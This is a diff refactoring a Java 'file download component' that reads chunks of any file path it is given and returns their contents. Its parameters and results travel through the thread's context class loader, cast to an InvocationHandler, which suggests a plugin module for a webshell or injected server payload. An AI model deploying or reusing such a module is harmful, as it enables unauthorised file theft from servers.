@@ -2,44 +2,38 @@ package org.leo.core.component;
 
 import java.io.File;
 import java.io.RandomAccessFile;
+import java.util.Arrays;
 import java.util.HashMap;
 
 /**
  * 文件下载组件
  * 提供高性能文件分块下载功能，兼容Java 6+
- * 
+ *
  * @author LeoSpring
  * @version 2.2
  */
 public class FileDownloadComponent implements Runnable {
-    
+
     private static final int MAX_CHUNK_SIZE = 1048576;
-    
+
     private HashMap<String, Object> params;
     private HashMap<String, Object> results;
 
-
-    
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
-            params = (java.util.HashMap) h.invoke(null, null, null);
-            results = new java.util.HashMap();
+            params = (HashMap) h.invoke(null, null, null);
+            results = new HashMap();
             invoke();
         } catch (Throwable t) {
-            if (results == null) results = new java.util.HashMap();
-            results.put("code", Integer.valueOf(500));
-            results.put("msg", t.getMessage());
+            if (results == null) results = new HashMap();
+            setResult(500, t.getMessage());
         }
         if (results != null) {
             try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
         }
     }
 
-    
-    /**
-     * 主要执行方法
-     */
     public void invoke() throws Exception {
         String path = getStringParam("path");
         long size = getLongParam("size", 0L);
@@ -54,26 +48,23 @@ public class FileDownloadComponent implements Runnable {
         if (offset < 0L) {
             throw new IllegalArgumentException("offset 不能为负数");
         }
-        
+
         File downloadFile = new File(path);
         if (!downloadFile.exists()) {
-            results.put("code", 404);
-            results.put("msg", "文件不存在: " + path);
+            setResult(404, "文件不存在: " + path);
             return;
         }
-        
+
         if (!downloadFile.canRead()) {
-            results.put("code", 403);
-            results.put("msg", "文件无读取权限: " + path);
+            setResult(403, "文件无读取权限: " + path);
             return;
         }
         if (!downloadFile.isFile()) {
-            results.put("code", 400);
-            results.put("msg", "path 不是普通文件: " + path);
+            setResult(400, "path 不是普通文件: " + path);
             return;
         }
         RandomAccessFile inputFile = null;
-        
+
         try {
             inputFile = new RandomAccessFile(downloadFile, "r");
 
@@ -84,29 +75,24 @@ public class FileDownloadComponent implements Runnable {
             }
 
             inputFile.seek(offset);
-            
+
             long availableSize = fileLength - offset;
             if (availableSize <= 0) {
-                results.put("code", 416);
-                results.put("msg", "请求范围不满足: offset=" + offset + ", fileSize=" + fileLength);
+                setResult(416, "请求范围不满足: offset=" + offset + ", fileSize=" + fileLength);
                 return;
             }
-            
+
             int readSize = (int) Math.min(Math.min(size, availableSize), (long) MAX_CHUNK_SIZE);
-            
+
             byte[] buffer = new byte[readSize];
             int totalRead = readChunk(inputFile, buffer);
-            
-            // 如果实际读取的数据少于请求的数据，调整数组大小
+
             if (totalRead < readSize) {
-                byte[] actualData = new byte[totalRead];
-                System.arraycopy(buffer, 0, actualData, 0, totalRead);
-                buffer = actualData;
+                buffer = Arrays.copyOf(buffer, totalRead);
             }
-            
+
             putChunkResult(buffer, fileLength, offset);
         } finally {
-            // 优化：确保资源正确关闭
             closeQuietly(inputFile);
         }
     }
@@ -122,7 +108,7 @@ public class FileDownloadComponent implements Runnable {
         results.put("nextOffset", nextOffset);
         results.put("isComplete", complete);
     }
-    
+
     private int readChunk(RandomAccessFile file, byte[] buffer) throws Exception {
         int totalRead = 0;
         while (totalRead < buffer.length) {
@@ -145,29 +131,21 @@ public class FileDownloadComponent implements Runnable {
         if (value == null) return defaultValue;
         if (value instanceof Number) return ((Number) value).longValue();
 
-        String text;
-        if (value instanceof byte[]) {
-            text = new String((byte[]) value, "UTF-8");
-        } else {
-            text = String.valueOf(value);
-        }
+        String text = getStringParam(key);
         try {
             return Long.parseLong(text.trim());
         } catch (NumberFormatException e) {
             throw new IllegalArgumentException(key + " 必须是整数: " + text);
         }
     }
-    
-    /**
-     * 安全关闭资源
-     */
+
+    private void setResult(int code, String message) {
+        results.put("code", Integer.valueOf(code));
+        results.put("msg", message);
+    }
+
     private void closeQuietly(java.io.Closeable resource) {
-        if (resource != null) {
-            try {
-                resource.close();
-            } catch (Exception e) {
-                // 忽略关闭异常
-            }
-        }
+        if (resource == null) return;
+        try { resource.close(); } catch (Exception ignored) {}
     }
 }
